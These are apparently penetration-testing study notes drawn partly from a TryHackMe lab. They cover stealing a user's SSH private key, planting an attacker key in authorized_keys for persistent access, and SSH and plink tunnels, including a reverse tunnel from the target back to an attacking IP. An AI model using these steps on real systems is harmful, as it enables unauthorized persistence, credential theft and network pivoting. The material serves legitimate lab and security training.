# SSH Secured Shell Connection

## Table of contents

- [SSH keys](#ssh-secured-shell-connection)
- [Forward Connections](#forward-connections)

## SSH keys

To make things even better, you should always try and get shell access to the box. Ideally with an `SSH` connection to have full shell access instead of not so stable or limited reverse or bind shells.

`id_rsa` file that contains a private key that can be used to connect to a box via `ssh`. It is usually located in the `.ssh` folder in the user's home folder. (Full path: `/home/USER/.ssh/id_rsa`). Get that file on your system and give it read/write-only permissions for your user, (`chmod 600 id_rsa`) and connect from the host machine by executing `ssh -i id_rsa USER@IP`.

In case if the target box does not have a generated `id_rsa` file (or you simply don't have reading permissions for it), you can still gain stable `ssh` access. All you need to do is generate your own `id_rsa` key on your system and include an associated key into `authorized_keys` file on the target machine.

Execute `ssh-keygen` and you should see `id_rsa` and `id_rsa.pub` files appear in your own `.ssh` folder. Copy the content of the `id_rsa.pub` file and put it inside the `authorized_keys` file on the target machine (located in `.ssh` folder). If the `authorized_keys` does not exist on the target machine, create it and `chmod 600 authorized_keys`. After that, connect to the machine using your `id_rsa` file with `ssh -i id_rsa USER@IP` and you won't be asked for a password. Note that this way you leave a trace of yourself.

NOTE: If the target machine does not have `ssh` config files at all. Just make them like previously mentioned.

NOTE: The ssh server also needs to allow this all.

````commandline
ssh-keygen -b 4096 
````

https://www.youtube.com/watch?v=ZhMw53Ud2tY

## Forward Connections

Source: <https://tryhackme.com/room/wreath>

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

### Port forwarding

Port forwarding is accomplished with the `-L` switch, which creates a link to a Local port. For example, if we had SSH access to `172.16.0.5` and there's a webserver running on `172.16.0.10`, we could use this command to create a link to the server on `172.16.0.10`: 

````commandline
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```` 

We could then access the website on `172.16.0.10 `(through `172.16.0.5`) by navigating to port `8000` on our own attacking machine. For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port `80` on the target server, and port `8000` on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use sudo to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.

### Proxies

- `Proxies` are made using the `-D` switch, for example: `-D 1337`. This will open up port `1337` on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as `proxychains`. An example of this command would be:

````commandline
ssh -D 1337 user@172.16.0.5 -fN
````

This again uses the `-fN` switches to background the shell. The choice of port `1337` is completely arbitrary -- all that matters is that the port is available and correctly set up in your `proxychains` (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.

## plink

`Plink.exe` is a Windows command line version of the `PuTTY SSH client`. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:

````commandline
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
````

Notice that this syntax is nearly identical to previously when using the standard OpenSSH client. The `cmd.exe /c echo y` at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.

To use our example from before, if we have access to `172.16.0.5` and would like to forward a connection to `172.16.0.10:80` back to port `8000` our own attacking machine (`172.16.0.20`), we could use this command:

````commandline
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
````

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using sudo `apt install putty-tools.` After downloading the tool, conversion can be done with: 

````commandline
puttygen KEYFILE -o OUTPUT_KEY.ppk
````

Substituting in a valid file for the keyfile, and adding in the output file.

The resulting `.ppk` file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).

Note: `Plink` is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at `/usr/share/windows-resources/binaries/plink.exe`, [downloading a new copy from here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) before a new engagement is sensible.

